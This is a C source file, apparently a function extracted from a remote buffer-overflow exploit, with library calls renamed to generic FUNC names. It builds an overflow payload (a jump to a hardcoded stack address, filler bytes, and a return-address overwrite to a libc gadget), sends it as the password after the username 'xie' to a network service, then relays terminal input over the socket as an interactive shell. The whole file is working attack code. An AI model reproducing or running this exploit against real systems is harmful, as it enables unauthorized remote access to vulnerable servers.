#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
typedef  int /*<<< orphan*/  fd_set ;
typedef  int /*<<< orphan*/  buf ;

/* Variables and functions */
 scalar_t__ FUNC0 (int,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  FUNC1 (int,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  FUNC2 (int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  FUNC3 (int) ; 
 int /*<<< orphan*/  FUNC4 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC5 (int /*<<< orphan*/ ,char*,char*) ; 
 int /*<<< orphan*/  FUNC6 (char*,char,int) ; 
 int /*<<< orphan*/  FUNC7 (char*) ; 
 int FUNC8 (int,char*,int) ; 
 int /*<<< orphan*/  FUNC9 (int,int /*<<< orphan*/ *,int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC10 (int,char*,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC11 (int) ; 
 int /*<<< orphan*/  stderr ; 
 int /*<<< orphan*/  stdout ; 
 int /*<<< orphan*/  FUNC12 (char*,char*) ; 
 int /*<<< orphan*/  FUNC13 (char*,char*) ; 
 int /*<<< orphan*/  FUNC14 (char*) ; 
 int /*<<< orphan*/  FUNC15 (int,char*,int) ; 

void FUNC16(int sd)
{
	char buf[1024];
	char exploit_buf[172];
	char cx[3]="\r\n\0";
	int x;
  	fd_set rset;

	FUNC6(exploit_buf,'\0',172);
	/* let's jump to 0xbffffe30 */
	/* eb 30 fe ff bf */

	x = 0;
	exploit_buf[x++]=0x68;
	/* push 0xbffffe30 */
	/* shellcode address */
	exploit_buf[x++]=0x30;
	exploit_buf[x++]=0xfe;
	exploit_buf[x++]=0xff;
	exploit_buf[x++]=0xff;
	exploit_buf[x++]=0xff;
	exploit_buf[x++]=0xbf;
	exploit_buf[x++]=0xbf;
	/* ret */
	exploit_buf[x++]=0xc3;
	
	FUNC6(exploit_buf+x,'A',150);
	x+=150;

/* will jmp in the middle of the NOP */
/* overwrite the eip with 0x40000f4f libc-2.3.2 */
/* at this address it is 
	pop $exx
	pop $exx
	ret 
*/
	exploit_buf[x++]=0xb5;
	exploit_buf[x++]=0xd4;

	FUNC11(2);

	FUNC6(buf,'\0',sizeof(buf));
	FUNC13(buf, "xie\r\n\0");

	FUNC7("[*] sending username \n");
	FUNC10(sd,buf,FUNC14(buf));
	
	FUNC11(1);
	FUNC7("[*] sending password\n");
	FUNC11(2);

	FUNC6(buf,'\0',sizeof(buf));
	FUNC13(buf, exploit_buf);
	FUNC12(buf,"\r\n\0");
	FUNC10(sd,buf,FUNC14(buf));

	FUNC11(2);
	FUNC4(stdout);
	FUNC2(&rset);
	while (1)
	{
		FUNC1(sd,&rset);
		FUNC1(0,&rset); 
		FUNC9(sd+1,&rset,0,0,0);
		if (FUNC0(sd,&rset)) 
		{
			FUNC6(buf,'\0',sizeof(buf));
			if ((x = FUNC8(sd,buf,sizeof(buf)-1)) == 0)
			{
				FUNC7("Connection closed by foreign host.\n");
				FUNC3(-1);
			}
			FUNC5(stderr,"%s",buf);
		}
		if (FUNC0(0,&rset))
		{
			FUNC6(buf,'\0',sizeof(buf));
			if ((x = FUNC8(0,buf,sizeof(buf)-1)) > 0)
			{
				FUNC15(sd,buf,x);
			}
		}
	}
}